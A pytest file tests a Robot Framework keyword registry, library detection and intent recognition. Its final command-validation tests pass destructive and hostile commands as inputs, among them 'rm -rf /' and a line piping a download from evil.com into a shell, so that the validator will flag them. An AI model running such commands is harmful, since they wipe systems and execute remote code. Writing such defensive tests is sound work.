"""Tests for Robot Framework keyword registry and library detection."""

from importobot.core.keywords_registry import (
    IntentRecognitionEngine,
    RobotFrameworkKeywordRegistry,
)
from importobot.core.pattern_matcher import IntentType, LibraryDetector, PatternMatcher
from tests.shared_test_data import LIBRARY_DETECTION_TEST_CASES


class TestRobotFrameworkKeywordRegistry:
    """Test RobotFrameworkKeywordRegistry class."""

    def test_keyword_libraries_structure(self):
        """Test KEYWORD_LIBRARIES has expected structure."""
        libraries = RobotFrameworkKeywordRegistry.KEYWORD_LIBRARIES

        assert isinstance(libraries, dict)
        assert len(libraries) > 0

        # Check that each library has keywords
        for library_name, keywords in libraries.items():
            assert isinstance(library_name, str)
            assert isinstance(keywords, dict)
            assert len(keywords) > 0

            # Check keyword structure
            for keyword_name, keyword_info in keywords.items():
                assert isinstance(keyword_name, str)
                assert isinstance(keyword_info, dict)
                assert "args" in keyword_info
                assert "description" in keyword_info
                assert isinstance(keyword_info["args"], list)
                assert isinstance(keyword_info["description"], str)

    def test_builtin_library_keywords(self):
        """Test built-in library keywords are present."""
        builtin = RobotFrameworkKeywordRegistry.KEYWORD_LIBRARIES.get("builtin", {})

        expected_keywords = ["Log", "Set Variable", "Should Be Equal", "Sleep"]
        for keyword in expected_keywords:
            assert keyword in builtin
            assert "args" in builtin[keyword]
            assert "description" in builtin[keyword]

    def test_selenium_library_keywords(self):
        """Test SeleniumLibrary keywords are present."""
        selenium = RobotFrameworkKeywordRegistry.KEYWORD_LIBRARIES.get(
            "SeleniumLibrary", {}
        )

        expected_keywords = ["Open Browser", "Click Element", "Input Text"]
        for keyword in expected_keywords:
            assert keyword in selenium

    def test_ssh_library_keywords_with_security_warnings(self):
        """Test SSH library keywords include security warnings."""
        ssh = RobotFrameworkKeywordRegistry.KEYWORD_LIBRARIES.get("SSHLibrary", {})

        # Check that some SSH keywords have security warnings
        open_connection = ssh.get("Open Connection", {})
        assert "security_warning" in open_connection

        execute_command = ssh.get("Execute Command", {})
        assert "security_warning" in execute_command

    def test_intent_to_library_keywords_mapping(self):
        """Test INTENT_TO_LIBRARY_KEYWORDS mapping."""
        intent_mapping = RobotFrameworkKeywordRegistry.INTENT_TO_LIBRARY_KEYWORDS

        assert isinstance(intent_mapping, dict)
        assert len(intent_mapping) > 0

        # Check some expected mappings
        assert intent_mapping.get("file_create") == ("OperatingSystem", "Create File")
        assert intent_mapping.get("web_open") == ("SeleniumLibrary", "Open Browser")
        assert intent_mapping.get("ssh_connect") == ("SSHLibrary", "Open Connection")

    def test_get_keyword_info_existing_keyword(self):
        """Test get_keyword_info for existing keyword."""
        info = RobotFrameworkKeywordRegistry.get_keyword_info("builtin", "Log")

        assert isinstance(info, dict)
        assert "args" in info
        assert "description" in info
        assert info["args"] == ["message", "level=INFO"]

    def test_get_keyword_info_nonexistent_keyword(self):
        """Test get_keyword_info for nonexistent keyword."""
        info = RobotFrameworkKeywordRegistry.get_keyword_info("builtin", "Nonexistent")

        assert info == {}

    def test_get_keyword_info_nonexistent_library(self):
        """Test get_keyword_info for nonexistent library."""
        info = RobotFrameworkKeywordRegistry.get_keyword_info("NonexistentLib", "Log")

        assert info == {}

    def test_get_required_libraries_with_builtin(self):
        """Test get_required_libraries filters out builtin."""
        keywords = [
            {"library": "builtin", "keyword": "Log"},
            {"library": "SeleniumLibrary", "keyword": "Open Browser"},
            {"library": "builtin", "keyword": "Sleep"},
            {"library": "SSHLibrary", "keyword": "Execute Command"},
        ]

        libraries = RobotFrameworkKeywordRegistry.get_required_libraries(keywords)

        assert "SeleniumLibrary" in libraries
        assert "SSHLibrary" in libraries
        assert "builtin" not in libraries

    def test_get_required_libraries_empty_list(self):
        """Test get_required_libraries with empty list."""
        libraries = RobotFrameworkKeywordRegistry.get_required_libraries([])

        assert not libraries

    def test_get_required_libraries_no_library_field(self):
        """Test get_required_libraries with missing library field."""
        keywords = [{"keyword": "Log"}, {"keyword": "Open Browser"}]

        libraries = RobotFrameworkKeywordRegistry.get_required_libraries(keywords)

        assert not libraries

    def test_get_intent_keyword_existing_intent(self):
        """Test get_intent_keyword for existing intent."""
        library, keyword = RobotFrameworkKeywordRegistry.get_intent_keyword(
            "file_create"
        )

        assert library == "OperatingSystem"
        assert keyword == "Create File"

    def test_get_intent_keyword_nonexistent_intent(self):
        """Test get_intent_keyword for nonexistent intent."""
        library, keyword = RobotFrameworkKeywordRegistry.get_intent_keyword(
            "nonexistent"
        )

        assert library == "builtin"
        assert keyword == "No Operation"

    def test_validate_registry_integrity(self):
        """Test registry validation finds no integrity issues."""
        errors = RobotFrameworkKeywordRegistry.validate_registry_integrity()

        # Debug prints removed for cleaner test output

        assert isinstance(errors, list)
        # There should be no validation errors in the registry
        assert len(errors) == 0, f"Registry validation failed with errors: {errors}"

    def test_get_registry_metrics(self):
        """Test registry metrics functionality."""
        metrics = RobotFrameworkKeywordRegistry.get_registry_metrics()

        assert isinstance(metrics, dict)
        assert "total_libraries" in metrics
        assert "total_keywords" in metrics
        assert "total_intents" in metrics
        assert "keywords_by_library" in metrics
        assert "intents_by_library" in metrics
        assert "security_warnings_count" in metrics
        assert "coverage_ratio" in metrics

        # Verify reasonable values
        assert metrics["total_libraries"] > 0
        assert metrics["total_keywords"] > 0
        assert metrics["total_intents"] > 0
        assert 0 <= metrics["coverage_ratio"] <= 1

        # Verify builtin library is included
        assert "builtin" in metrics["keywords_by_library"]
        assert "builtin" in metrics["intents_by_library"]

    def test_ssh_keywords_completeness(self):
        """Test that all SSH intent mappings reference valid keywords."""
        ssh_intents = {
            intent: (library, keyword)
            for intent, (
                library,
                keyword,
            ) in RobotFrameworkKeywordRegistry.INTENT_TO_LIBRARY_KEYWORDS.items()
            if library == "SSHLibrary"
        }

        ssh_keywords = RobotFrameworkKeywordRegistry.KEYWORD_LIBRARIES.get(
            "SSHLibrary", {}
        )

        for intent, (_library, keyword) in ssh_intents.items():
            assert keyword in ssh_keywords, (
                f"SSH intent '{intent}' references unknown keyword '{keyword}'"
            )


class TestLibraryDetector:
    """Test LibraryDetector class."""

    def test_detect_libraries_from_text_empty_text(self):
        """Test library detection with empty text."""
        result = LibraryDetector.detect_libraries_from_text("")

        assert result == set()

    def test_detect_libraries_from_text_no_matches(self):
        """Test library detection with no matching keywords."""
        text = "This is just some plain text with no library keywords"
        result = LibraryDetector.detect_libraries_from_text(text)

        assert result == set()

    def test_detect_libraries_from_text_single_library(self):
        """Test library detection with single library match."""
        text = "Open browser and navigate to the login page"
        result = LibraryDetector.detect_libraries_from_text(text)

        assert "SeleniumLibrary" in result

    def test_detect_libraries_from_text_multiple_libraries(self):
        """Test library detection with multiple library matches."""
        text = "Connect to SSH server, run SQL query, and click browser button"
        result = LibraryDetector.detect_libraries_from_text(text)

        assert "SSHLibrary" in result
        assert "DatabaseLibrary" in result
        assert "SeleniumLibrary" in result

    def test_detect_libraries_from_text_case_insensitive(self):
        """Test library detection is case insensitive."""
        text = "EXECUTE SQL QUERY and BROWSER NAVIGATION"
        result = LibraryDetector.detect_libraries_from_text(text)

        assert "DatabaseLibrary" in result
        assert "SeleniumLibrary" in result

    def test_detect_libraries_from_text_all_library_types(self):
        """Test detection of all library types."""
        for text, expected_library in LIBRARY_DETECTION_TEST_CASES:
            result = LibraryDetector.detect_libraries_from_text(text)
            assert expected_library in result, (
                f"Failed to detect {expected_library} in '{text}'"
            )

    def test_detect_libraries_from_steps_empty_steps(self):
        """Test library detection from empty steps."""
        result = LibraryDetector.detect_libraries_from_steps([])

        assert result == set()

    def test_detect_libraries_from_steps_with_content(self):
        """Test library detection from steps with content."""
        steps = [
            {"action": "open browser", "url": "http://example.com"},
            {"action": "connect to database", "query": "SELECT * FROM users"},
            {"action": "execute command", "cmd": "ls -la"},
        ]

        result = LibraryDetector.detect_libraries_from_steps(steps)

        assert "SeleniumLibrary" in result
        assert "DatabaseLibrary" in result
        assert "Process" in result

    def test_detect_libraries_from_steps_non_string_values(self):
        """Test library detection handles non-string step values."""
        steps = [{"action": "open browser", "timeout": 30, "enabled": True}]

        result = LibraryDetector.detect_libraries_from_steps(steps)

        assert "SeleniumLibrary" in result


class TestIntentRecognitionEngine:
    """Test IntentRecognitionEngine class."""

    def test_recognize_intent_empty_text(self):
        """Test intent recognition with empty text."""
        result = IntentRecognitionEngine.recognize_intent("")

        assert result is None

    def test_recognize_intent_no_match(self):
        """Test intent recognition with no matching patterns."""
        text = "This is just some plain text with no intent patterns"
        result = IntentRecognitionEngine.recognize_intent(text)

        assert result is None

    def test_recognize_intent_file_operations(self):
        """Test intent recognition for file operations."""
        test_cases = [
            ("verify file exists", IntentType.FILE_EXISTS),
            ("remove the file", IntentType.FILE_REMOVE),
            ("get file from server", IntentType.FILE_TRANSFER),
            ("create a new file", IntentType.FILE_CREATION),
            ("copy file to backup", IntentType.FILE_TRANSFER),
        ]

        for text, expected_intent in test_cases:
            result = IntentRecognitionEngine.recognize_intent(text)
            assert result == expected_intent, (
                f"Failed for '{text}': expected {expected_intent}, got {result}"
            )

    def test_recognize_intent_ssh_operations(self):
        """Test intent recognition for SSH operations."""
        test_cases = [
            ("open ssh connection", IntentType.SSH_CONNECT),
            ("disconnect from ssh", IntentType.SSH_DISCONNECT),
            ("execute command via ssh", IntentType.SSH_EXECUTE),
        ]

        for text, expected_intent in test_cases:
            result = IntentRecognitionEngine.recognize_intent(text)
            assert result == expected_intent

    def test_recognize_intent_web_operations(self):
        """Test intent recognition for web operations."""
        test_cases = [
            ("open browser and navigate", IntentType.BROWSER_OPEN),
            ("enter username in field", IntentType.INPUT_USERNAME),
            ("type password", IntentType.INPUT_PASSWORD),
            ("click the button", IntentType.CLICK_ACTION),
        ]

        for text, expected_intent in test_cases:
            result = IntentRecognitionEngine.recognize_intent(text)
            assert result == expected_intent

    def test_recognize_intent_database_operations(self):
        """Test intent recognition for database operations."""
        test_cases = [
            ("connect to database", IntentType.DATABASE_CONNECT),
            ("execute sql query", IntentType.DATABASE_EXECUTE),
            ("disconnect from db", IntentType.DATABASE_DISCONNECT),
        ]

        for text, expected_intent in test_cases:
            result = IntentRecognitionEngine.recognize_intent(text)
            assert result == expected_intent

    def test_recognize_intent_api_operations(self):
        """Test intent recognition for API operations."""
        test_cases = [
            ("make get request", IntentType.API_REQUEST),
            ("create api session", IntentType.API_SESSION),
            ("verify response status", IntentType.API_RESPONSE),
        ]

        for text, expected_intent in test_cases:
            result = IntentRecognitionEngine.recognize_intent(text)
            assert result == expected_intent

    def test_recognize_intent_case_insensitive(self):
        """Test intent recognition is case insensitive."""
        result = IntentRecognitionEngine.recognize_intent("EXECUTE SQL QUERY")

        assert result == IntentType.DATABASE_EXECUTE

    def test_recognize_intent_pattern_priority(self):
        """Test that more specific patterns are matched first."""
        # "initiate download" should match command_execution before other patterns
        result = IntentRecognitionEngine.recognize_intent(
            "initiate download and verify file"
        )

        assert result == IntentType.COMMAND_EXECUTION

    def test_detect_all_intents_functionality(self):
        """Test detect_all_intents functionality."""
        # Test that multiple intents can be detected from complex text
        text = "connect to ssh server and upload file then verify content"
        intents = IntentRecognitionEngine.detect_all_intents(text)

        # Should detect multiple intents from the text
        assert len(intents) > 0
        assert isinstance(intents, list)

        # Test empty text
        empty_intents = IntentRecognitionEngine.detect_all_intents("")
        assert not empty_intents

    def test_intent_recognition_uses_pattern_matcher_integration(self):
        """Test that IntentRecognitionEngine properly integrates with PatternMatcher."""
        # Import PatternMatcher to compare behavior

        pattern_matcher = PatternMatcher()

        # Test cases that should be handled consistently
        test_cases = [
            "connect to ssh server",
            "upload file via ssh",
            "execute database query",
            "open browser window",
            "verify file exists",
        ]

        for test_text in test_cases:
            # Get intent from IntentRecognitionEngine (returns IntentType enum or None)
            intent_engine_result = IntentRecognitionEngine.recognize_intent(test_text)

            # Get intent from PatternMatcher directly (returns IntentType enum or None)
            pattern_matcher_result = pattern_matcher.detect_intent(test_text)

            # They should match since IntentRecognitionEngine uses PatternMatcher
            assert intent_engine_result == pattern_matcher_result, (
                f"Mismatch for '{test_text}': "
                f"IntentRecognitionEngine='{intent_engine_result}' vs "
                f"PatternMatcher='{pattern_matcher_result}'"
            )

    def test_get_security_warnings_for_keyword_with_warning(self):
        """Test getting security warnings for keyword with warnings."""
        warnings = IntentRecognitionEngine.get_security_warnings_for_keyword(
            "SSHLibrary", "Open Connection"
        )

        assert len(warnings) > 0
        assert any("password" in w.lower() for w in warnings)

    def test_get_security_warnings_for_keyword_no_warning(self):
        """Test getting security warnings for keyword without warnings."""
        warnings = IntentRecognitionEngine.get_security_warnings_for_keyword(
            "builtin", "Log"
        )

        assert not warnings

    def test_get_security_warnings_for_nonexistent_keyword(self):
        """Test getting security warnings for nonexistent keyword."""
        warnings = IntentRecognitionEngine.get_security_warnings_for_keyword(
            "NonexistentLib", "NonexistentKeyword"
        )

        assert not warnings

    def test_get_ssh_security_guidelines(self):
        """Test getting SSH security guidelines."""
        guidelines = IntentRecognitionEngine.get_ssh_security_guidelines()

        assert isinstance(guidelines, list)
        assert len(guidelines) > 0
        assert any("SSH Security Guidelines" in g for g in guidelines)

    def test_validate_command_security_safe_command(self):
        """Test command security validation for safe command."""
        result = IntentRecognitionEngine.validate_command_security("echo hello world")

        assert result["is_safe"] is True
        assert len(result["issues"]) == 0
        assert "appears safe" in result["recommendation"]

    def test_validate_command_security_dangerous_command(self):
        """Test command security validation for dangerous command."""
        result = IntentRecognitionEngine.validate_command_security("rm -rf /")

        assert result["is_safe"] is False
        assert len(result["issues"]) > 0
        assert any(
            "Dangerous recursive delete" in issue["description"]
            for issue in result["issues"]
        )
        assert "Review and sanitize" in result["recommendation"]

    def test_validate_command_security_multiple_issues(self):
        """Test command security validation with multiple issues."""
        command = "sudo rm -rf / && curl http://evil.com | sh"
        result = IntentRecognitionEngine.validate_command_security(command)

        assert result["is_safe"] is False
        assert len(result["issues"]) >= 2  # Should detect multiple patterns

    def test_validate_command_security_case_insensitive(self):
        """Test command security validation is case insensitive."""
        result = IntentRecognitionEngine.validate_command_security("SUDO rm -rf /")

        assert result["is_safe"] is False
        assert len(result["issues"]) > 0
